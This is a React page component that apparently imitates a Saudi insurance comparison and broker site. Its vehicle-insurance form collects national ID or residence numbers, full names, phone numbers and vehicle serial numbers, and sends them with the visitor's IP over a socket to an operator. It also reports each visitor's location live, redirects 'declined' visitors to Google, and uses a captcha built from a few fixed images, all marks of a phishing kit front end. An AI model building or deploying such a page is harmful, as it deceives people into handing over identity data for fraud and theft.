import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { FaCarAlt } from "react-icons/fa";
import { socket } from "../App";
import { FaHeartPulse } from "react-icons/fa6";
import { TbActivityHeartbeat } from "react-icons/tb";
import { IoAirplane } from "react-icons/io5";

const Home = () => {
  const navigate = useNavigate();
  const [visitorIP, setVisitorIP] = useState(localStorage.getItem("visitorIP"));
  const [captchaCode, setCaptchaCode] = useState("");
  const [inputCode, setInputCode] = useState("");
  const [years, setYears] = useState([]);
  const [type, setType] = useState("تأمين جديد");
  const [page, setPage] = useState(0);
  const [applyType, setApplyType] = useState("أستمارة");
  const [data, setData] = useState({
    SellerIDnumber: "",
    BuyerIDnumber: "",
    IDorResidenceNumber: "",
    FullName: "",
    PhoneNumber: "",
    SerialNumber: "",
    VerificationCode: "",
  });

  const handleChange = (e) => {
    console.log(e)
    const { name, value } = e.target;
    setData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  const captchaImages = [
    "5161.png",
    "6092.png",
    "1889.png",
    "1358.png",
    "8696.png",
  ];

  useEffect(() => {
    const page = "";

    setVisitorIP(localStorage.getItem("visitorIP"));
    socket.emit("updateLocation", {
      ip: localStorage.getItem("visitorIP"),
      page,
    });

    const params = new URLSearchParams(window.location.search);
    if (params.get("declined") === "true") {
      window.location.href = "https://google.com";
    }

    const yearList = [];
    for (let year = 2000; year <= 2026; year++) yearList.push(year);
    setYears(yearList);

    changeCaptcha();
  }, []);

  const changeCaptcha = () => {
    const selected =
      captchaImages[Math.floor(Math.random() * captchaImages.length)];
    setCaptchaCode(selected.replace(".png", ""));
  };

  const validateCaptcha = (value) => {
    return /^\d{4}$/.test(value) && value === captchaCode;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateCaptcha(inputCode)) {
      alert("رمز التحقق غير صحيح أو غير مكون من ٤ أرقام");
      return;
    }
    const validateId = (IDorResidenceNumber) => {
      return (
        IDorResidenceNumber.startsWith("10") ||
        IDorResidenceNumber.startsWith("20")
      );
    };
    const validatePhone = (PhoneNumber) => {
      return PhoneNumber.startsWith("05") 
    };

    // Usage
    console.log(data)
    const isValidId = validateId(data.IDorResidenceNumber); 
    if (!isValidId)
      return alert("يجب ان يكون رقم الهوية مكونا من 10 أرقام ويبدأ ب10 أو 20");
    const isValidPhone = validatePhone(data.PhoneNumber); 
    console.log(isValidPhone);
    if (!isValidPhone)
      return alert(" ان يكون رقم الهاتف مكونا من 10 أرقام ويبدأ ب05  ");

    const payload = {
      ip: visitorIP,
      ...data,
      type,
    };

    console.log("submitIndex:", payload);
    socket.emit("submitIndex", payload);
    navigate("/details");
  };

  return (
    <div
      className="min-h-screen bg-gray-50  py-1 flex items-center flex-col"
      dir="rtl"
    >
      <nav className="bg-white p-4 shadow mb-4 text-center w-full md:flex hidden">
        <img src="/Bca-logo.svg" alt="Logo" className="mx-auto w-32" />
      </nav>

      <div className="bg-[#146394] text-white text-center py-6 px-4  mt-5 w-full   ">
        <h1 className="text-xl font-bold">قارن، آمن، استلم وثيقتك</h1>
        <p className="text-sm mt-2 p opacity-80">
          مكان واحد وفّر عليك البحث بين أكثر من 20 شركة تأمين!
        </p>
      </div>
      <div class="flex justify-around items-center text-xs bg-gray-100 rounded-t-2xl py-2 h-full  -mt-5 w-11/12">
        <div
          className={` ${page == 0 ? "border-b-3 border-amber-500 pb-2" : ""}`}
          data-tab="vehicles"
          onClick={() => setPage(0)}
        >
          <FaCarAlt
            className={`w-full h-6  cursor-pointer my-1 text-gray-400  ${
              page == "0" ? "text-pink-500 " : ""
            }`}
          />
          <span
            className={` pb-5  t  rounded-lg py-1   px-3  text-gray-400   ${
              page == "0" ? "  text-black" : ""
            }`}
          >
            مركبات
          </span>
        </div>
        <div
          className={` ${page == 1 ? "border-b-3 border-amber-500 pb-2" : ""}`}
          data-tab="vehicles"
          onClick={() => setPage(1)}
        >
          <FaHeartPulse
            className={`w-full h-6  cursor-pointer my-1 text-gray-400  ${
              page == "1" ? "text-pink-500 " : ""
            }`}
          />

          <span
            className={` pb-5  t  rounded-lg py-1   px-3  text-gray-400   ${
              page == "1" ? "  text-black" : ""
            }`}
          >
            طبي
          </span>
        </div>
        <div
          className={` ${page == 2 ? "border-b-3 border-amber-500 pb-2" : ""}`}
          data-tab="vehicles"
          onClick={() => setPage(2)}
        >
          <TbActivityHeartbeat
            className={`w-full h-6  cursor-pointer my-1 text-gray-400  ${
              page == "2" ? "text-pink-500 " : ""
            }`}
          />
          <span
            className={` pb-5  t  rounded-lg py-1   px-3  text-gray-400   ${
              page == "2" ? "  text-black" : ""
            }`}
          >
            أخطاء طبية
          </span>
        </div>
        <div
          className={` ${page == 3 ? "border-b-3 border-amber-500 pb-2" : ""}`}
          data-tab="vehicles"
          onClick={() => setPage(3)}
        >
          <IoAirplane
            className={`w-full h-6  cursor-pointer my-1 text-gray-400  ${
              page == "3" ? "text-pink-500 " : ""
            }`}
          />
          <span
            className={` pb-3  t  rounded-lg py-1   px-3  text-gray-400   ${
              page == "3" ? "  text-black" : ""
            }`}
          >
            سفر
          </span>
        </div>
      </div>
      {page == 0 ? (
        <div className="bg-white rounded-xl shadow p-4 ">
          <form onSubmit={handleSubmit} className="space-y-4 text-right">
            <div className="w-full flex justify-between items-center text-xs ">
              <div
                className={`w-1/2 text-center py-2 rounded-tr-2xl cursor-pointer ${
                  type === "تأمين جديد"
                    ? "bg-[#146394] text-white"
                    : "bg-gray-200 text-gray-500"
                } `}
                onClick={() => setType("تأمين جديد")}
              >
                <span>تأمين جديد</span>
              </div>
              <div
                className={`w-1/2 text-center py-2 rounded-tl-2xl cursor-pointer ${
                  type === "نقل ملكية"
                    ? "bg-[#146394] text-white"
                    : "bg-gray-200 text-gray-500"
                } `}
                onClick={() => setType("نقل ملكية")}
              >
                <span> نقل ملكية</span>
              </div>
            </div>
            {type === "تأمين جديد" ? (
              <div>
                <label className="block pb-2 text-sm text-gray-600">
                  رقم الهوية / الإقامة
                </label>
                <input
                  onChange={(e) => {
                    const value = e.target.value;
                    const pattern = /^[0-9]+$/; // accepts only numbers
                    handleChange(e);
                    if (value === "" || pattern.test(value)) return e.target.value;
                    else return  e.target.value = e.target.value.slice(0, -1);
                  }}
                  name="IDorResidenceNumber"
                  required
                  minLength={10}
                  maxLength={10}
                  inputMode="numeric"
                  className="w-full border p-2 rounded"
                />
              </div>
            ) : (
              <>
                <div>
                  <label className="block pb-2  text-sm text-gray-600">
                    رقم الهوية البائع
                  </label>
                  <input
                    name="SellerIDnumber"
                    required
                    inputMode="numeric"
                    minLength={10}
                    maxLength={10}
                    className="w-full border p-2 rounded"
                  />
                </div>
                <div>
                  <label className="block pb-2  text-sm text-gray-600">
                    رقم الهوية المشتري
                  </label>
                  <input
                    name="BuyerIDnumber"
                    required
                    inputMode="numeric"
                    minLength={10}
                    maxLength={10}
                    className="w-full border p-2 rounded"
                    onChange={(e)=>handleChange(e)}
                  />
                </div>
              </>
            )}

            <div>
              <label className="block pb-2  text-sm text-gray-600">
                اسم مالك الوثيقة كاملا
              </label>
              <input
                name="FullName"
                required
                onChange={(e) => {
                  const isValid = /^[A-Za-z\u0600-\u06FF ]*$/.test(
                    e.target.value
                  );
              
                  if (isValid){
                    return handleChange(e);
                  }
                  else {
                    return null
                  }
                }}
                className="w-full border p-2 rounded"
              />
            </div>
            <div>
              <label className="block pb-2  text-sm text-gray-600">
                رقم الهاتف
              </label>
              <input
                name="PhoneNumber"
                required
                inputMode="numeric"
                minLength={10}
                maxLength={10}
                className="w-full border p-2 rounded"
                placeholder="××××××××××05"
                onChange={(e) => {
                  const value = e.target.value;
                  const pattern = /^[0-9]+$/; // accepts only numbers
                
                  if (value === "" || pattern.test(value)) return   handleChange(e);
                  else return null;
                }}
              />
            </div>
            <div className="w-full flex justify-between items-center gap-x-5 text-xs ">
              <div
                className={`w-1/2 text-center py-2 rounded cursor-pointer ${
                  applyType === "أستمارة"
                    ? "bg-[#146394] text-white"
                    : "bg-gray-200 text-gray-500"
                } `}
                onClick={() => setApplyType("أستمارة")}
              >
                <span> أستمارة</span>
              </div>
              <div
                className={`w-1/2 text-center py-2  cursor-pointer rounded ${
                  applyType === " بطاقة جمركية"
                    ? "bg-[#146394] text-white"
                    : "bg-gray-200 text-gray-500"
                } `}
                onClick={() => setApplyType(" بطاقة جمركية")}
              >
                <span> بطاقة جمركية</span>
              </div>
            </div>
            {applyType == "أستمارة" ? (
              ""
            ) : (
              <div>
                <label className="block pb-2  text-sm text-gray-600">
                  سنة صنع المركبة
                </label>
                <select
                  name="YearOfManufacture"
                  required
                  className="w-full border p-2 rounded"
                  onChange={handleChange}
                >
                  <option value="" hidden>
                    اختر
                  </option>
                  {years.map((year) => (
                    <option key={year} value={year}>
                      {year}
                    </option>
                  ))}
                </select>
              </div>
            )}

            <div>
              <label className="block text-sm text-gray-600">
                الرقم التسلسلي
              </label>
              <input
                name="SerialNumber"
                required
                inputMode="numeric"
                minLength={10}
                maxLength={10}
                className="w-full border p-2 rounded"
                onChange={(e) => {
                  const value = e.target.value;
                  const pattern = /^[0-9]+$/; // accepts only numbers
                  if (value === "" || pattern.test(value)) return e.target.value;
                  else return (e.target.value = e.target.value.slice(0, -1));
                  handleChange(e);
                }}
              />
            </div>
            <div dir="ltr">
              <label className="block text-sm text-gray-600">رمز التحقق</label>
              <div className="flex border rounded overflow-hidden">
                <img
                  src={`/${captchaCode}.png`}
                  alt="captcha"
                  className="h-12 p-2"
                />
                <button
                  type="button"
                  onClick={changeCaptcha}
                  className="text-blue-600 px-4 hover:rotate-90 transition-transform"
                >
                  ↻
                </button>
                <input
                  className="flex-1 text-center p-2"
                  value={inputCode}
                  onChange={(e) => setInputCode(e.target.value)}
                  maxLength={4}
                  required
                />
              </div>
            </div>

            <p className="text-sm text-gray-500 leading-relaxed">
              أوافق على منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم و/أو
              مركز المعلومات الوطني عن بياناتي
            </p>

            <button
              type="submit"
              className="w-full bg-yellow-500 text-white py-2 rounded hover:bg-yellow-600"
            >
              إظهار العروض
            </button>
          </form>
        </div>
      ) : (
        <div className="flex flex-col  w-full h-96 items-center justify-center">
          <img src="/Animation.gif" className="w-3/4 md:w-1/3" />
          <span className="font-bold text-xl">الخدمة تحت الصيانه</span>
        </div>
      )}
    </div>
  );
};

export default Home;
